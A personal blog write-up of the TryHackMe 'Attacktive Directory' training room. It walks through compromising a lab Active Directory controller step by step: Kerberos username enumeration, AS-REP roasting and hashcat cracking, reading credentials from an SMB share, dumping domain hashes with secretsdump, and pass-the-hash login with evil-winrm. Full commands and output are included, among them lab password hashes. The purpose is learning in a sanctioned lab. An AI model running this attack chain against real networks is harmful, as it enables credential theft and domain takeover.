---
title: Tryhackme Attacktive Directory
image: /images/ad/info.png
tags: 
- writeup
- tryhackme
- windows
---

About time I learned a bitActive Directory. I could have started blasting away at some HTB boxes but I am trying to take it slow. Younger me would have straight up started nmap scans on an insane level boxes, giveup halfway and never completed that box. Instead, I tried to do some easy THM boxes which are good for learning and more importantly, my mental health. This room had quite a lot of hints. Let's start.

<!--more-->

<img src="/images/ad/info.png">

Start with basic nmap scan. This time I will add the `-A` flag because I know we are dealing with domain controllers and many open ports. The `-A` flag will give me info about all of those i.e the domain information, smb policies etc.

{%highlight text%}
nmap -T4 -Pn -A 10.10.27.108

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-04-15 05:42:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-04-15T05:42:20+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-14T04:56:56
| Not valid after:  2021-10-14T04:56:56
| MD5:   aa26 3014 7611 2dc1 03cc f968 b1d9 adcd
|_SHA-1: 937c 3e5e 313f 1ec2 ae7f 0186 34f3 6867 df58 5a04
|_ssl-date: 2021-04-15T05:42:29+00:00; -1s from scanner time.
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-04-15T05:42:21
|_  start_date: N/A

{%endhighlight%}

So a bunch of data is returned. We got the domain name. Lets add an entry in the hosts file.

`10.10.27.108     spookysec.local`

The web server on port 80 was just a default installation of IIS server. 

The room gives us a custom user and password list. The room also recommends we use [kerbrute](https://github.com/ropnop/kerbrute) to find possible valid usernames. We used the userenum method. This is how it works in the words of the kerbrute doc itself

{%highlight text%}
To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on.
{%endhighlight%}

I ran kerbrute and got a big list of valid usernames.

{%highlight text%}
$ ./kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local -t 100 userlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/15/21 - Ronnie Flathers @ropnop

2021/04/15 05:36:49 >  Using KDC(s):
2021/04/15 05:36:49 >  	spookysec.local:88

2021/04/15 05:36:49 >  [+] VALID USERNAME:	 james@spookysec.local
2021/04/15 05:36:50 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2021/04/15 05:36:50 >  [+] VALID USERNAME:	 James@spookysec.local
2021/04/15 05:36:50 >  [+] VALID USERNAME:	 robin@spookysec.local
2021/04/15 05:36:52 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2021/04/15 05:36:53 >  [+] VALID USERNAME:	 administrator@spookysec.local
2021/04/15 05:36:55 >  [+] VALID USERNAME:	 backup@spookysec.local
2021/04/15 05:36:56 >  [+] VALID USERNAME:	 paradox@spookysec.local
2021/04/15 05:37:03 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2021/04/15 05:37:10 >  [+] VALID USERNAME:	 Robin@spookysec.local
2021/04/15 05:37:23 >  [+] VALID USERNAME:	 Administrator@spookysec.local
2021/04/15 05:37:56 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2021/04/15 05:38:04 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2021/04/15 05:38:36 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
2021/04/15 05:38:46 >  [+] VALID USERNAME:	 ori@spookysec.local
2021/04/15 05:39:02 >  [+] VALID USERNAME:	 ROBIN@spookysec.local
2021/04/15 05:39:54 >  Done! Tested 73317 usernames (16 valid) in 184.867 seconds

{%endhighlight%}

Next up, we try to get extract information from some of these accounts. What we are about to do is known as AS-REP roasting. Here is my best understanding:

`In active directory there is an option which allows users to request user data without any authentication. This was allowed because the data returned is encrypted using the users password. **But** we can use some part of the returned encrypted data ( a TGT to be exact) to bruteforce for a password using a wordlist.`

To get the accounts which have this setting we use the impacket's GetNPUsers.py script. To get the user accounts I just copied the output of kerbrute and did some bash magic.

`$ cat kerbruteOutput | cut -d' ' -f8 > validUsers.txt`

Next we use the GetNPUsers script.

{%highlight text%}
GetNPUsers.py -usersfile validUsers spookysec.local/svc-admin 
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Password:
[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:f7abb51f87ed3e343af9c0f9c7b63241$682507edb4e7f32c9f1031f15f7300112adba603d2eaf94a4eda89d13ae2c5479c99fd7f6db466887c5840a48bb760178adba5f203cb4caa0770e667c53e70defafdc10a3927842be22aa5281006446dd6d55ce458dbc45574c6194aed76a38101eb15458ca534742939f4650cb9f24be4e9055a66edb005eab7b13190f8e18f63d2daa2a785cca7f1aa1f5e256b262078ce370897d6d9ad12994f32b775ca39e3f1b6e2c4a873eb7356b1eca16e4f2e12591c0a0741519c01d76788d3c890c73e7aaa35ae3288181f6161d998d97a0b5e520025a2dcb1af8853b19784f5eb8d3b570840d7c07892c2e7083bc5353bb49389
[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
{%endhighlight%}

I also found [this awesome video](https://forum.hackthebox.eu/discussion/2749/getnpusers-py-explained-video) for what was happening above.

Now that we have the encrypted TGT for the user "svc-admin" we save it to a file and bruteforce for a password using hashcat.

`hashcat -a 0 -m 18200 TGT.txt passwordlist.txt`

We cracked the password.

Next we can try logging into the SMB service.

{%highlight text%}
$ smbclient -U svc-admin -L \\\\10.10.27.108\\             
Enter WORKGROUP\svc-admin's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 

{%endhighlight%}

"backup" looks good. Lets try listing its contents.

{%highlight text%}
$ smbclient -U svc-admin \\\\10.10.27.108\\backup
Enter WORKGROUP\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 19:08:39 2020
  ..                                  D        0  Sat Apr  4 19:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 19:08:53 2020
{%endhighlight%}

Now just use "get backup_credentials.txt" to download the file.

{%highlight text%}
$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
{%endhighlight%}

Now we have a new set of credentials!

The room advised that we use another impacket script "secretsdump.py". What this does is just dump the NTLM hashes of the accounts present in the AD if the current account has access to the NTDS.dit file. The NTDS.dit files contains active directory data such as groups, hashes, accounts etc.

{%highlight text%}
$ secretsdump.py backup@spookysec.local              
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:9927ea2eb4e69e7935f91fe57ef5711b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:5081c2173ee46154ab643fb71630c5ce5c30872a35d64307b1d69863595064be
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:20308f94a07e2a236e26a99cbe63530d
ATTACKTIVEDIREC$:des-cbc-md5:316ec21a8f86d076
[*] Cleaning up... 
{%endhighlight%}

And now that we have hashes for all accounts we can use pass-the-hash technique to login using evil-winrm. pass-the-hash is nothing but another form of authentication in which instead of credentials we provide  a hash to log in.

{%highlight text%}
$ evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.27.108

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>

*Evil-WinRM* PS C:\Users\svc-admin\Desktop> whoami
thm-ad\administrator
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> hostname
AttacktiveDirectory
{%endhighlight%}

And now we logged in as admin using the admin hash. Form there just read all the flags from everyone's Desktop.

Nice and easy box, learned a bit about Active directory, cleared some confusions about the TGT and finally performed pass-the-hash.